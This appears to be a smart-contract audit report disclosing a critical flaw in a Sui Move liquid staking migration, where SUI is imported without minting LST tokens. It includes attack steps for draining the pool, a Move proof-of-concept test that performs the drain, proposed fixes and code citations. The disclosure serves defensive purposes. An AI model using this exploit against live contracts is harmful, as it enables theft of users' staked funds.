# Audit Report

## Title
Migration Ratio Check Bypassed - First Staker Can Drain All Migrated Funds

## Summary
The V1â†’V2 migration process creates a critical vulnerability where `import_stakes` adds migrated SUI reserves without minting corresponding LST tokens, leaving the pool in a state with `total_sui_supply > 0` but `total_lst_supply = 0`. This bypasses the ratio sanity check and allows the first staker after migration to receive LST at 1:1 ratio despite massive reserves, enabling them to drain 100% of migrated funds for minimal cost.

## Finding Description

**Root Cause - No LST Token Minting During Migration**

The `import_stakes` function adds migrated SUI to the pool without minting LST tokens. [1](#0-0)  The function calls `join_to_sui_pool` which only increases `total_sui_supply` without any LST minting. [2](#0-1) 

After migration completes, the pool state is:
- `total_sui_supply = migrated_amount` (e.g., 1,000,000 SUI)
- `total_lst_supply = 0` (no tokens exist)

**Ratio Check Bypass**

The migration includes a sanity check that is completely ineffective. [3](#0-2) 

The `get_ratio()` function returns 0 when `total_lst_supply == 0`. [4](#0-3)  This makes the assertion `assert!(ratio <= min_ratio, 0)` become `assert!(0 <= min_ratio, 0)` which always passes for any non-negative value.

**Exploitation via Special Case**

After the admin unpauses the pool (step 6 of migration flow), [5](#0-4)  the first user to stake triggers a special case that explicitly allows staking when `old_sui_supply > 0 && old_lst_supply == 0`. [6](#0-5) 

The `sui_amount_to_lst_amount` function returns a 1:1 ratio when `total_lst_supply == 0`. [7](#0-6)  This means the first staker receives LST tokens equal to their SUI input (minus fees), despite the pool containing massive reserves.

**Complete Fund Drain**

After staking minimal SUI (e.g., 0.1 SUI), the attacker owns 100% of the LST supply. When they unstake, the `lst_amount_to_sui_amount` function calculates their share proportionally. [8](#0-7) 

With 100% LST ownership, they receive `(total_sui_supply * lst_amount) / total_lst_supply = 100%` of all SUI in the pool (minus fees).

## Impact Explanation

**Critical - Complete Loss of Migrated Funds**

This vulnerability results in 100% theft of all V1 user funds migrated to V2:

1. **Total Fund Loss**: All migrated SUI (potentially millions) can be stolen
2. **Trivial Execution Cost**: Attack requires only ~0.1 SUI (minimum stake amount)
3. **Deterministic Success**: The exploit is guaranteed due to code logic
4. **All Users Affected**: Every V1 user who migrated loses their entire principal
5. **Irreversible**: Once executed, funds are permanently stolen

**Quantified Example:**
- Migration imports: 1,000,000 SUI
- Attack cost: 0.1 SUI
- Attacker profit: ~999,900 SUI (after fees)
- User loss: 100%

## Likelihood Explanation

**Near 100% - Highly Probable and Trivially Executable**

1. **No Special Privileges Required**: Any user can execute via public `stake_entry`. [9](#0-8) 

2. **Simple Attack Steps**:
   - Monitor migration completion and pool unpause
   - Call `stake_entry` with minimal SUI
   - Call `unstake_entry` to withdraw all funds

3. **Migration Flow Guarantees Vulnerability**: The documented migration flow requires unpausing after completion, creating the vulnerable window.

4. **Economically Rational**: Attack cost minimal, potential gain millions - infinite ROI

5. **Race Condition**: First transaction wins, attacker can front-run with high gas

## Recommendation

**Fix 1: Mint LST Tokens During Migration**

The `import_stakes` function should mint LST tokens proportional to the migrated SUI amount, maintaining the V1 ratio:

```move
public fun import_stakes(
    migration_storage: &mut MigrationStorage,
    _: &MigrationCap,
    admin_cap: &AdminCap,
    stake_pool: &mut StakePool,
    metadata: &mut Metadata<CERT>,
    system_state: &mut SuiSystemState,
    import_amount: u64,
    min_ratio: u64,
    ctx: &mut TxContext
) {
    let amount = import_amount.min(migration_storage.sui_balance.value());
    
    // Calculate LST to mint based on V1 ratio or 1:1 for first import
    let lst_to_mint = calculate_lst_for_migration(amount);
    
    stake_pool.set_paused(admin_cap, false);
    stake_pool.join_to_sui_pool(migration_storage.sui_balance.split(amount));
    
    // Mint LST tokens to represent migrated value
    let migration_lst = metadata.mint(lst_to_mint, ctx);
    // Transfer to treasury or burn (depending on design)
    
    stake_pool.rebalance(metadata, system_state, ctx);
    stake_pool.set_paused(admin_cap, true);
    
    let ratio = stake_pool.get_ratio(metadata);
    assert!(ratio <= min_ratio, 0);
}
```

**Fix 2: Remove Special Case**

Remove or restrict the special case condition that allows staking when `total_lst_supply == 0`:

```move
assert!(
    (lst.value() as u128) * old_sui_supply <= (sui_balance.value() as u128) * old_lst_supply,
    ERatio
);
// Remove: || (old_sui_supply > 0 && old_lst_supply == 0)
```

## Proof of Concept

```move
#[test]
fun test_migration_drain_attack() {
    use sui::test_scenario;
    use liquid_staking::stake_pool;
    use liquid_staking::migration;
    
    let admin = @0xADMIN;
    let attacker = @0xATTACKER;
    
    let mut scenario = test_scenario::begin(admin);
    
    // Setup: Admin completes migration with 1M SUI
    {
        migration::test_init(scenario.ctx());
        scenario.next_tx(admin);
        let mut migration_storage = scenario.take_shared<MigrationStorage>();
        let mut migration_cap = scenario.take_from_sender<MigrationCap>();
        
        // Simulate importing 1,000,000 SUI
        migration::deposit_sui(&mut migration_storage, &mut migration_cap, &mut test_coin, 1_000_000_000_000_000, scenario.ctx());
        
        migration::create_stake_pool(&mut migration_cap, scenario.ctx());
        scenario.next_tx(admin);
        
        let mut stake_pool = scenario.take_shared<StakePool>();
        let admin_cap = scenario.take_from_sender<AdminCap>();
        let mut metadata = scenario.take_shared<Metadata<CERT>>();
        let mut system_state = scenario.take_shared<SuiSystemState>();
        
        // Import stakes - NO LST MINTED
        migration::import_stakes(&mut migration_storage, &migration_cap, &admin_cap, &mut stake_pool, &mut metadata, &mut system_state, 1_000_000_000_000_000, 1_000_000_000, scenario.ctx());
        
        // Verify vulnerable state
        assert!(stake_pool.total_sui_supply() == 1_000_000_000_000_000);
        assert!(stake_pool::total_lst_supply(&metadata) == 0);
        
        // Admin unpauses pool (step 6 of migration)
        stake_pool.set_paused(&admin_cap, false);
        
        test_scenario::return_shared(stake_pool);
        test_scenario::return_shared(metadata);
        test_scenario::return_shared(system_state);
        test_scenario::return_to_sender(&scenario, admin_cap);
        test_scenario::return_shared(migration_storage);
        test_scenario::return_to_sender(&scenario, migration_cap);
    };
    
    // Attack: Attacker stakes 0.1 SUI and drains pool
    scenario.next_tx(attacker);
    {
        let mut stake_pool = scenario.take_shared<StakePool>();
        let mut metadata = scenario.take_shared<Metadata<CERT>>();
        let mut system_state = scenario.take_shared<SuiSystemState>();
        
        // Attacker stakes minimal amount
        let attack_sui = coin::mint_for_testing<SUI>(100_000_000, scenario.ctx()); // 0.1 SUI
        let lst = stake_pool.stake(&mut metadata, &mut system_state, attack_sui, scenario.ctx());
        
        // Attacker now owns 100% of LST supply
        let attacker_lst = lst.value();
        assert!(attacker_lst > 0);
        assert!(stake_pool::total_lst_supply(&metadata) == attacker_lst);
        
        // Attacker unstakes and receives ~1M SUI
        let drained_sui = stake_pool.unstake(&mut metadata, &mut system_state, lst, scenario.ctx());
        
        // Verify attacker drained almost all funds
        assert!(drained_sui.value() > 999_000_000_000_000); // ~999k SUI after fees
        
        coin::burn_for_testing(drained_sui);
        test_scenario::return_shared(stake_pool);
        test_scenario::return_shared(metadata);
        test_scenario::return_shared(system_state);
    };
    
    scenario.end();
}
```

## Notes

This vulnerability is **VALID and CRITICAL**. The code explicitly contains a special case that allows the vulnerable state, and the migration process is designed in a way that guarantees this state occurs. The attack is trivially executable by any user with minimal capital via public entry functions, requires no special privileges, and results in 100% theft of migrated funds.

### Citations

**File:** liquid_staking/sources/migration/migrate.move (L4-10)
```text
/// flow:
/// 1. create stake pool
/// 2. export stakes
/// 3. take unclaimed fees
/// 4. import stakes
/// 5. destroy migration cap
/// 6. unpause the pool (after migration)
```

**File:** liquid_staking/sources/migration/migrate.move (L173-173)
```text
        stake_pool.join_to_sui_pool(migration_storage.sui_balance.split(amount));
```

**File:** liquid_staking/sources/migration/migrate.move (L178-179)
```text
        let ratio = stake_pool.get_ratio(metadata);
        assert!(ratio <= min_ratio, 0);
```

**File:** liquid_staking/sources/validator_pool.move (L531-534)
```text
    public(package) fun join_to_sui_pool(self: &mut ValidatorPool, sui: Balance<SUI>) {
        self.total_sui_supply = self.total_sui_supply + sui.value();
        self.sui_pool.join(sui);
    }
```

**File:** liquid_staking/sources/stake_pool.move (L176-186)
```text
    public entry fun stake_entry(
        self: &mut StakePool, 
        metadata: &mut Metadata<CERT>,
        system_state: &mut SuiSystemState, 
        sui: Coin<SUI>, 
        ctx: &mut TxContext
    ) {
        self.manage.check_version();
        let cert = self.stake(metadata, system_state, sui, ctx);
        transfer::public_transfer(cert, ctx.sender());
    }
```

**File:** liquid_staking/sources/stake_pool.move (L257-261)
```text
        assert!(
            ((lst.value() as u128) * old_sui_supply <= (sui_balance.value() as u128) * old_lst_supply)
            || (old_sui_supply > 0 && old_lst_supply == 0), // special case
            ERatio
        );
```

**File:** liquid_staking/sources/stake_pool.move (L592-593)
```text
        if (total_sui_supply == 0 || total_lst_supply == 0) {
            return 0
```

**File:** liquid_staking/sources/stake_pool.move (L636-637)
```text
        if (total_sui_supply == 0 || total_lst_supply == 0) {
            return sui_amount
```

**File:** liquid_staking/sources/stake_pool.move (L657-659)
```text
        let sui_amount = (total_sui_supply as u128)
            * (lst_amount as u128) 
            / (total_lst_supply as u128);
```
